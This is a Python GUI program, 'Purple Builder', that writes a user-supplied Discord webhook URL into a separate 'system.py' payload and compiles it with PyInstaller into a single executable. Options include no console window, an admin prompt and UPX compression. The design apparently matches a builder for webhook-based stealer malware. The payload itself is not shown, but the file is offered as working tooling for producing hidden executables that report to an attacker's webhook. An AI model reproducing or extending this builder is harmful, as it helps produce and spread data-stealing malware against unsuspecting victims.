import customtkinter as ctk
import subprocess
import threading
import shutil
import random
import sys
import os
import re

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SOURCE   = os.path.join(BASE_DIR, "system.py")
DIST_DIR = os.path.join(BASE_DIR, "Pyinstaller")
WORK_DIR = os.path.join(BASE_DIR, "Pyinstaller", "build_tmp")

BG         = "#08080B"
CARD       = "#0F0F14"
CARD2      = "#13131A"
BORDER     = "#1C1C28"
BORDER2    = "#252535"
ACCENT     = "#7C3AED"
ACCENT_HOV = "#8B5CF6"
ACCENT_DIM = "#1E1030"
ACCENT_GL  = "#A78BFA"
TEXT       = "#F0EFF8"
MUTED      = "#4A4A6A"
MUTED2     = "#6B6B8F"
SUCCESS    = "#10B981"
ERROR      = "#F43F5E"
WARNING    = "#F59E0B"

BOUBOU_MSGS = [
    "made by boubou  ✦",
    "crafted by boubou  ◈",
    "boubou's creation  ⬡",
    "© boubou  ∴",
    "boubou was here  ▸",
    "built with ♥ by boubou",
    "boubou industries™",
    "~ boubou ~",
]


class OptionSwitch(ctk.CTkFrame):
    def __init__(self, parent, label, desc, default=True, **kw):
        super().__init__(parent, fg_color="transparent", **kw)
        self.var = ctk.BooleanVar(value=default)
        self.switch = ctk.CTkSwitch(
            self, text="", variable=self.var,
            width=40, height=20,
            fg_color=BORDER2, progress_color=ACCENT,
            button_color=ACCENT_GL, button_hover_color=TEXT,
        )
        self.switch.pack(side="left", padx=(0, 8))
        inner = ctk.CTkFrame(self, fg_color="transparent")
        inner.pack(side="left", fill="x", expand=True)
        ctk.CTkLabel(inner, text=label, font=("Courier New", 9, "bold"),
                     text_color=TEXT, anchor="w").pack(anchor="w")
        ctk.CTkLabel(inner, text=desc, font=("Courier New", 8),
                     text_color=MUTED, anchor="w").pack(anchor="w")

    def get(self):
        return self.var.get()


class PurpleBuilder(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Purple Builder")
        self.geometry("700x760")
        self.minsize(700, 760)
        self.resizable(True, True)
        self.configure(fg_color=BG)
        self._build_ui()
        self._tick_boubou()

    def _build_ui(self):

        header = ctk.CTkFrame(self, fg_color=CARD, corner_radius=0,
                              height=56, border_width=1, border_color=BORDER)
        header.pack(fill="x", side="top")
        header.pack_propagate(False)
        ctk.CTkLabel(header, text="⬡ PURPLE BUILDER",
                     font=("Courier New", 14, "bold"),
                     text_color=ACCENT_GL).pack(side="left", padx=22)
        
    
        self.status_badge = ctk.CTkLabel(header, text="● READY",
                                         font=("Courier New", 10, "bold"),
                                         text_color=SUCCESS)
        self.status_badge.pack(side="right", padx=22)

        footer_frame = ctk.CTkFrame(self, fg_color=CARD, corner_radius=0,
                                    height=28, border_width=1, border_color=BORDER)
        footer_frame.pack(fill="x", side="bottom")
        footer_frame.pack_propagate(False)
        self.footer = ctk.CTkLabel(footer_frame, text=BOUBOU_MSGS[0],
                                   font=("Courier New", 9),
                                   text_color=ACCENT_DIM)
        self.footer.pack(side="right", padx=16)


        body = ctk.CTkScrollableFrame(self, fg_color="transparent",
                                      scrollbar_button_color=BORDER2,
                                      scrollbar_button_hover_color=ACCENT)
        body.pack(fill="both", expand=True, padx=0, pady=0)

        inner = ctk.CTkFrame(body, fg_color="transparent")
        inner.pack(fill="both", expand=True, padx=22, pady=16)


        self._slabel(inner, "WEBHOOK URL")
        wh = ctk.CTkFrame(inner, fg_color=CARD2, corner_radius=8,
                           border_width=1, border_color=BORDER, height=42)
        wh.pack(fill="x", pady=(4, 0))
        wh.pack_propagate(False)
        self.webhook_entry = ctk.CTkEntry(
            wh, placeholder_text="https://discord.com/api/webhooks/...",
            font=("Courier New", 11), fg_color="transparent",
            border_width=0, text_color=TEXT, placeholder_text_color=MUTED,
        )
        self.webhook_entry.pack(fill="both", expand=True, padx=12)


        self._slabel(inner, "OUTPUT FILE NAME", top=12)
        nf = ctk.CTkFrame(inner, fg_color=CARD2, corner_radius=8,
                           border_width=1, border_color=BORDER, height=42)
        nf.pack(fill="x", pady=(4, 0))
        nf.pack_propagate(False)
        ni = ctk.CTkFrame(nf, fg_color="transparent")
        ni.pack(fill="both", expand=True, padx=12)
        self.name_entry = ctk.CTkEntry(
            ni, placeholder_text="purple  (sans .exe)",
            font=("Courier New", 11), fg_color="transparent",
            border_width=0, text_color=TEXT, placeholder_text_color=MUTED,
        )
        self.name_entry.pack(side="left", fill="both", expand=True)
        ctk.CTkLabel(ni, text=".exe", font=("Courier New", 11, "bold"),
                     text_color=MUTED2).pack(side="right")


        self._slabel(inner, "BUILD OPTIONS", top=12)
        opts_card = ctk.CTkFrame(inner, fg_color=CARD2, corner_radius=10,
                                  border_width=1, border_color=BORDER)
        opts_card.pack(fill="x", pady=(4, 0))
        left  = ctk.CTkFrame(opts_card, fg_color="transparent")
        left.grid(row=0, column=0, sticky="nsew", padx=14, pady=12)
        right = ctk.CTkFrame(opts_card, fg_color="transparent")
        right.grid(row=0, column=1, sticky="nsew", padx=14, pady=12)
        opts_card.grid_columnconfigure((0, 1), weight=1)

        self.opt_onefile   = OptionSwitch(left,  "ONEFILE",      "Compile en un seul .exe",    default=True)
        self.opt_onefile.pack(fill="x", pady=(0, 8))
        self.opt_noconsole = OptionSwitch(left,  "NO CONSOLE",   "Pas de fenetre noire",       default=True)
        self.opt_noconsole.pack(fill="x", pady=(0, 8))
        self.opt_uac       = OptionSwitch(left,  "UAC ADMIN",    "Demande les droits admin",   default=False)
        self.opt_uac.pack(fill="x")

        self.opt_clean     = OptionSwitch(right, "AUTO CLEAN",   "Supprime les fichiers temp", default=True)
        self.opt_clean.pack(fill="x", pady=(0, 8))
        self.opt_upx       = OptionSwitch(right, "UPX COMPRESS", "Compresse le binaire (UPX)", default=False)
        self.opt_upx.pack(fill="x", pady=(0, 8))
        self.opt_debug     = OptionSwitch(right, "DEBUG LOG",    "Affiche tous les logs",      default=False)
        self.opt_debug.pack(fill="x")


        self._slabel(inner, "OUTPUT DIRECTORY", top=12)
        od = ctk.CTkFrame(inner, fg_color=CARD2, corner_radius=8,
                           border_width=1, border_color=BORDER, height=34)
        od.pack(fill="x", pady=(4, 0))
        od.pack_propagate(False)
        ctk.CTkLabel(od, text=DIST_DIR, font=("Courier New", 9),
                     text_color=MUTED2).pack(side="left", padx=12)


        self._slabel(inner, "BUILD LOG", top=12)
        self.log_box = ctk.CTkTextbox(
            inner, height=130, fg_color=CARD2, border_width=1,
            border_color=BORDER, corner_radius=8,
            font=("Courier New", 9), text_color=TEXT,
            scrollbar_button_color=BORDER2,
        )
        self.log_box.pack(fill="x", pady=(4, 0))
        self.log_box.configure(state="disabled")

        self.progress = ctk.CTkProgressBar(inner, fg_color=BORDER2,
                                           progress_color=ACCENT, corner_radius=4)
        self.progress.set(0)


        self.build_btn = ctk.CTkButton(
            inner, text="  ▶  BUILD",
            font=("Courier New", 14, "bold"),
            fg_color=ACCENT, hover_color=ACCENT_HOV,
            corner_radius=8, height=50,
            command=self._start_build,
        )
        self.build_btn.pack(fill="x", pady=(14, 4))

    def _slabel(self, parent, text, top=0):
        ctk.CTkLabel(parent, text=text, font=("Courier New", 9, "bold"),
                     text_color=MUTED).pack(anchor="w", pady=(top, 0))

    def _log(self, msg, _=None):
        self.log_box.configure(state="normal")
        self.log_box.insert("end", msg + "\n")
        self.log_box.see("end")
        self.log_box.configure(state="disabled")

    def _set_status(self, text, color):
        self.status_badge.configure(text=f"● {text}", text_color=color)

    def _tick_boubou(self):
        self.footer.configure(
            text=random.choice(BOUBOU_MSGS),
            text_color=random.choice([ACCENT_DIM, MUTED, "#2A1050", "#1A1A40", BORDER2])
        )
        self.after(random.randint(3000, 6500), self._tick_boubou)
    def _start_build(self):
        webhook = self.webhook_entry.get().strip()
        if not webhook:
            self._log("[!] Webhook URL requis.")
            return
        if not webhook.startswith("http"):
            self._log("[!] URL invalide.")
            return
        self.build_btn.configure(state="disabled", text="  ◌  BUILDING...")
        self._set_status("BUILDING", WARNING)
        self.progress.pack(fill="x", pady=(6, 0))
        self.progress.start()
        threading.Thread(target=self._build, args=(webhook,), daemon=True).start()

    def _build(self, webhook: str):
        try:
            exe_name = re.sub(r'[^\w\-]', '_', self.name_entry.get().strip() or "purple")
            self._log(f"[*] Target: {exe_name}.exe")
            self._log(f"[*] Patching source...")

            with open(SOURCE, "r", encoding="utf-8") as f:
                src = f.read()
            patched = re.sub(
                r'WEBHOOK_URL\s*=\s*["\'].*?["\']',
                f'WEBHOOK_URL = "{webhook}"',
                src
            )
            tmp_src = os.path.join(BASE_DIR, "_build_tmp.py")
            with open(tmp_src, "w", encoding="utf-8") as f:
                f.write(patched)

            self._log(f"[*] Source patched.")
            os.makedirs(DIST_DIR, exist_ok=True)
            os.makedirs(WORK_DIR, exist_ok=True)

            python_dir = os.path.dirname(sys.executable)
            pyi_exe = os.path.join(python_dir, "Scripts", "pyinstaller.exe")
            if not os.path.exists(pyi_exe):
                pyi_exe = os.path.join(python_dir, "pyinstaller.exe")
            cmd = [pyi_exe] if os.path.exists(pyi_exe) else [sys.executable, "-m", "PyInstaller"]

            if self.opt_onefile.get():   cmd.append("--onefile")
            if self.opt_noconsole.get(): cmd.append("--noconsole")
            if self.opt_uac.get():       cmd.append("--uac-admin")
            if not self.opt_upx.get():   cmd.append("--noupx")

            cmd += ["--distpath", DIST_DIR, "--workpath", WORK_DIR,
                    "--specpath", WORK_DIR, "--name", exe_name, tmp_src]

            self._log(f"[*] Running PyInstaller...")
            if self.opt_debug.get():
                self._log(f"[>] {' '.join(cmd)}")

            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, encoding="utf-8", errors="replace",
                cwd=BASE_DIR,
                creationflags=0x08000000 if os.name == "nt" else 0,
            )
            for line in proc.stdout:
                line = line.rstrip()
                if line and (self.opt_debug.get() or not line.startswith("INFO:")):
                    self._log(line)
            proc.wait()

            if os.path.exists(tmp_src):
                os.remove(tmp_src)
            if self.opt_clean.get() and os.path.exists(WORK_DIR):
                shutil.rmtree(WORK_DIR, ignore_errors=True)

            if proc.returncode == 0:
                self._log(f"\n[+] Build OK!")
                self._log(f"[+] {os.path.join(DIST_DIR, exe_name + '.exe')}")
                self.after(0, self._on_success)
            else:
                self._log(f"\n[-] Build failed (code {proc.returncode}).")
                self.after(0, self._on_failure)

        except Exception as e:
            self._log(f"\n[-] Exception: {e}")
            self.after(0, self._on_failure)

    def _on_success(self):
        self.progress.stop(); self.progress.set(1)
        self._set_status("SUCCESS", SUCCESS)
        self.build_btn.configure(state="normal", text="  ▶  BUILD AGAIN",
                                 fg_color=SUCCESS, hover_color="#059669")

    def _on_failure(self):
        self.progress.stop(); self.progress.set(0)
        self._set_status("FAILED", ERROR)
        self.build_btn.configure(state="normal", text="  ▶  RETRY BUILD",
                                 fg_color=ERROR, hover_color="#BE123C")


if __name__ == "__main__":
    app = PurpleBuilder()
    app.mainloop()